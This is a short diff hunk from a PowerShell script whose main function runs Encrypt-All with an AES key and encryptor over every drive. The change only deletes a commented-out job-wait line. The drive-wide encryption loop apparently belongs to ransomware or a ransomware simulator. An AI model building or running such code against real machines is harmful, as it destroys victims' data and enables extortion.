@@ -200,6 +200,5 @@ function main{
     foreach ($drive in $drives){
         Encrypt-All $key $drive $aesManaged $encryptor
     }
-    #Get-Job | Wait-Job 
     $aesManaged.Dispose()
 }
